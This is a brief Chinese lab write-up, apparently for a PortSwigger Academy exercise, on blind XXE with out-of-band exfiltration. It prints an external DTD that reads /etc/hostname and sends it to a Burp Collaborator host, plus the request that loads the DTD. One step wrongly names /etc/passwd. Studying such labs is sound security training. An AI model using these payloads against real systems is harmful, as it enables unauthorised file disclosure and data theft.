## 盲打xxe时，为了将敏感数据带出，可以使用外部dtd文件



## 1. 首先服务器部署dtd文件，poc内容：

```javascript
<!ENTITY % file SYSTEM "file:///etc/hostname">
//敏感数据保存地址
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://m0nto7pg0wegiq1yunxknsnullrcf1.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```

该DTD执行以下步骤：

- 定义名为的XML参数实体file，其中包含/etc/passwd文件的内容。

- 定义一个名为的XML参数实体eval，其中包含另一个名为的XML参数实体的动态	声明exfiltrate。该exfiltrate实体将通过使含有的值的HTTP请求到攻击者的web服务器进行评价fileURL查询字符串内的实体。

- 使用eval实体，这将导致exfiltrate执行实体的动态声明。

- 使用exfiltrate实体，以便通过请求指定的URL来评估其值。



## 2. xxe，访问攻击服务器部署的dtd文件

poc:

```javascript
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://ac6f1fce1f241d918045d10f01e3006b.web-security-academy.net/exploit.dtd"> %xxe; ]>
<stockCheck><productId>%xxe</productId><storeId>1</storeId></stockCheck>
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/XXE/images/2B3899131D7F4032A752B4885523F872clipboard.png)



## 3. burp collaborator客户端接收到file:///etc/hostname内容

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/XXE/images/C5AB6C9E83864E27863535AE09B0D862clipboard.png)

